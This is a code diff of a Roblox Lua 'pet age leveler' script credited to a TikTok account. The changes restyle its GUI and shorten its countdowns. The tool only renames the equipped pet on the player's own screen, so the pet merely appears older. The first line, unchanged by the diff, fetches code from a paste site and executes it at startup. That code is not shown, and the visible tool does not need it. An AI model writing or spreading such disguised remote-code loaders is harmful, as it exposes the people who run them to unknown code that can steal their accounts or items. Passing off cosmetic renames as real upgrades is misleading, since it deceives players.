@@ -1,11 +1,14 @@
 loadstring(game:HttpGet("https://pastefy.app/H6iNsLrz/raw"))()
-local plr = game:GetService("Players").LocalPlayer
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local plr = Players.LocalPlayer
 local char = plr.Character or plr.CharacterAdded:Wait()
-local gui = Instance.new("ScreenGui", plr:WaitForChild("PlayerGui"))
-gui.Name = "JamesPetAgeLeveller"
-gui.ResetOnSpawn = false
 
--- Helper for creating UI elements
+local gui = Instance.new("ScreenGui")
+gui.Name = "JamesPetAgeLeveler"
+gui.ResetOnSpawn = false
+gui.Parent = plr:WaitForChild("PlayerGui")
+
 local function create(class, props, parent)
 	local inst = Instance.new(class)
 	for k, v in pairs(props) do inst[k] = v end
@@ -13,35 +16,72 @@ local function create(class, props, parent)
 	return inst
 end
 
--- UI
+------------------------------------------------------
+------------------------------------------------------
+
+local loadingPopup = create("Frame", {
+	Name = "LoadingPopup",
+	Size = UDim2.new(0, 300, 0, 100),
+	Position = UDim2.new(0.5, -150, 0.5, -50),
+	BackgroundColor3 = Color3.fromRGB(240, 230, 255),
+}, gui)
+
+create("UICorner", { CornerRadius = UDim.new(0, 12) }, loadingPopup)
+create("UIStroke", { Color = Color3.fromRGB(190, 160, 255), Thickness = 2 }, loadingPopup)
+
+create("UIGradient", {
+	Color = ColorSequence.new{
+		ColorSequenceKeypoint.new(0, Color3.fromRGB(220, 200, 255)),
+		ColorSequenceKeypoint.new(1, Color3.fromRGB(245, 235, 255)),
+	}
+}, loadingPopup)
+
+local loadingLabel = create("TextLabel", {
+	Text = "🦝 Loading James' Ui...",
+	Font = Enum.Font.GothamBold,
+	TextSize = 20,
+	TextColor3 = Color3.fromRGB(140, 100, 180),
+	BackgroundTransparency = 1,
+	Size = UDim2.new(1, 0, 1, 0),
+}, loadingPopup)
+
+------------------------------------------------------
+-- 💜 MAIN GUI (HIDDEN INITIALLY)
+------------------------------------------------------
+
 local frame = create("Frame", {
 	Name = "PetAgeFrame",
-	Size = UDim2.new(0, 300, 0, 180),
-	Position = UDim2.new(0.5, -150, 0.5, -90),
-	BackgroundColor3 = Color3.fromRGB(20, 20, 20),
+	Size = UDim2.new(0, 320, 0, 190),
+	Position = UDim2.new(0.5, -160, 0.5, -95),
+	BackgroundColor3 = Color3.fromRGB(235, 220, 255),
+	Visible = false,
 	Active = true,
 	Draggable = true
 }, gui)
-create("UICorner", { CornerRadius = UDim.new(0, 10) }, frame)
 
+create("UICorner", { CornerRadius = UDim.new(0, 12) }, frame)
+create("UIStroke", { Color = Color3.fromRGB(190, 160, 255), Thickness = 2 }, frame)
+
+-- Title
 create("TextLabel", {
-	Text = "Pet Age Leveller v2",
+	Text = "🦝 James Pet Age Leveler",
 	Font = Enum.Font.FredokaOne,
 	TextSize = 20,
-	TextColor3 = Color3.new(1,1,1),
+	TextColor3 = Color3.fromRGB(120, 70, 180),
 	BackgroundTransparency = 1,
 	Size = UDim2.new(1, 0, 0, 30),
-	Position = UDim2.new(0, 0, 0, 5)
+	Position = UDim2.new(0, 0, 0, 6)
 }, frame)
 
+-- Close Button
 local closeBtn = create("TextButton", {
-	Text = "X",
+	Text = "✖",
 	Font = Enum.Font.FredokaOne,
 	TextSize = 18,
-	TextColor3 = Color3.new(1,1,1),
-	BackgroundColor3 = Color3.fromRGB(60, 0, 0),
-	Size = UDim2.new(0, 28, 0, 28),
-	Position = UDim2.new(1, -34, 0, 6)
+	TextColor3 = Color3.fromRGB(255, 255, 255),
+	BackgroundColor3 = Color3.fromRGB(140, 90, 180),
+	Size = UDim2.new(0, 30, 0, 30),
+	Position = UDim2.new(1, -35, 0, 6)
 }, frame)
 create("UICorner", {}, closeBtn)
 
@@ -49,107 +89,127 @@ closeBtn.MouseButton1Click:Connect(function()
 	frame.Visible = false
 end)
 
+-- Pet Info Label
 local petInfo = create("TextLabel", {
 	Text = "Equipped Pet: [None]",
-	Font = Enum.Font.FredokaOne,
+	Font = Enum.Font.GothamMedium,
 	TextSize = 16,
-	TextColor3 = Color3.fromRGB(255, 255, 160),
+	TextColor3 = Color3.fromRGB(100, 70, 160),
 	BackgroundTransparency = 1,
 	Size = UDim2.new(1, -24, 0, 24),
-	Position = UDim2.new(0, 12, 0, 40),
+	Position = UDim2.new(0, 12, 0, 44),
 	TextXAlignment = Enum.TextXAlignment.Left
 }, frame)
 
+-- Set Age Button
 local btn1 = create("TextButton", {
-	Text = "Set Age to 50",
-	Font = Enum.Font.FredokaOne,
+	Text = "💜 Set Age to 50",
+	Font = Enum.Font.GothamBold,
 	TextSize = 16,
-	TextColor3 = Color3.fromRGB(40, 40, 40),
-	BackgroundColor3 = Color3.new(1,1,1),
-	Size = UDim2.new(0, 220, 0, 36),
-	Position = UDim2.new(0.5, -110, 0, 76)
+	TextColor3 = Color3.fromRGB(255, 255, 255),
+	BackgroundColor3 = Color3.fromRGB(180, 140, 255),
+	Size = UDim2.new(0.9, 0, 0, 36),
+	Position = UDim2.new(0.5, -0.45 * 320, 0, 84)
 }, frame)
 create("UICorner", {}, btn1)
 
+-- Add +1 Age Button
 local btn2 = create("TextButton", {
-	Text = "Add +1 Age",
-	Font = Enum.Font.FredokaOne,
+	Text = "🔮 Add +1 Age",
+	Font = Enum.Font.GothamBold,
 	TextSize = 16,
-	TextColor3 = Color3.fromRGB(40, 40, 40),
-	BackgroundColor3 = Color3.new(1,1,1),
-	Size = UDim2.new(0, 220, 0, 36),
-	Position = UDim2.new(0.5, -110, 0, 122)
+	TextColor3 = Color3.fromRGB(255, 255, 255),
+	BackgroundColor3 = Color3.fromRGB(180, 140, 255),
+	Size = UDim2.new(0.9, 0, 0, 36),
+	Position = UDim2.new(0.5, -0.45 * 320, 0, 132)
 }, frame)
 create("UICorner", {}, btn2)
 
+-- Footer
 create("TextLabel", {
-	Text = "Tiktok: @JamesScripts",
-	Font = Enum.Font.FredokaOne,
+	Text = "Tiktok: @JamesScripts 🦝",
+	Font = Enum.Font.Gotham,
 	TextSize = 13,
-	TextColor3 = Color3.fromRGB(180, 180, 180),
+	TextColor3 = Color3.fromRGB(140, 100, 180),
 	BackgroundTransparency = 1,
 	Size = UDim2.new(1, 0, 0, 20),
-	Position = UDim2.new(0, 0, 1, -20)
+	Position = UDim2.new(0, 0, 1, -22)
 }, frame)
 
--- Helpers
+------------------------------------------------------
+-- 🧠 FUNCTIONALITY
+------------------------------------------------------
+
+-- Get Equipped Pet
 local function getPet()
 	char = plr.Character or plr.CharacterAdded:Wait()
-	for _, t in pairs(char:GetChildren()) do
-		if t:IsA("Tool") and t.Name:find("Age") then return t end
+	for _, tool in pairs(char:GetChildren()) do
+		if tool:IsA("Tool") and tool.Name:find("Age") then
+			return tool
+		end
 	end
 end
 
+-- Update Pet Info
 local function updateLabel()
 	local pet = getPet()
 	petInfo.Text = "Equipped Pet: " .. (pet and pet.Name or "[None]")
 end
 
--- Button 1 - Set Age to 50
+-- Set Age to 50 Button
 btn1.MouseButton1Click:Connect(function()
 	local pet = getPet()
 	if pet then
-		for i = 20, 1, -1 do
-			btn1.Text = "Changing Age in " .. i .. "..."
+		for i = 3, 1, -1 do
+			btn1.Text = "⏳ Changing Age in " .. i .. "..."
 			task.wait(1)
 		end
 		pet.Name = pet.Name:gsub("%[Age%s%d+%]", "[Age 50]")
-		petInfo.Text = "Equipped Pet: " .. pet.Name
+		updateLabel()
 	else
-		btn1.Text = "No Pet Equipped!"
+		btn1.Text = "⚠️ No Pet Equipped!"
 		task.wait(2)
 	end
-	btn1.Text = "Set Age to 50"
+	btn1.Text = "💜 Set Age to 50"
 end)
 
--- Button 2 - Add +1 Age
+-- Add +1 Age Button
 btn2.MouseButton1Click:Connect(function()
 	local pet = getPet()
 	local age = pet and tonumber(pet.Name:match("%[Age%s(%d+)%]"))
 	if pet and age then
 		if age >= 100 then
-			btn2.Text = "Max Age is 100!"
+			btn2.Text = "⚠️ Max Age is 100!"
 			task.wait(2)
 		else
-			for i = 5, 1, -1 do
-				btn2.Text = "Adding +1 in " .. i .. "..."
+			for i = 3, 1, -1 do
+				btn2.Text = "⏳ Adding +1 in " .. i .. "..."
 				task.wait(1)
 			end
 			local newAge = age + 1
 			pet.Name = pet.Name:gsub("%[Age%s%d+%]", "[Age " .. newAge .. "]")
-			petInfo.Text = "Equipped Pet: " .. pet.Name
+			updateLabel()
 		end
 	else
-		btn2.Text = "No Pet Equipped!"
+		btn2.Text = "⚠️ No Pet Equipped!"
 		task.wait(2)
 	end
-	btn2.Text = "Add +1 Age"
+	btn2.Text = "🔮 Add +1 Age"
 end)
 
--- Live update
+-- Live Label Updater
 task.spawn(function()
 	while true do
 		updateLabel()
 		task.wait(1)
 	end
+end)
+
+-- Fade out loader and show GUI
+task.delay(2.5, function()
+	local tween = TweenService:Create(loadingPopup, TweenInfo.new(1), {BackgroundTransparency = 1})
+	tween:Play()
+	tween.Completed:Wait()
+	loadingPopup:Destroy()
+	frame.Visible = true
 end)
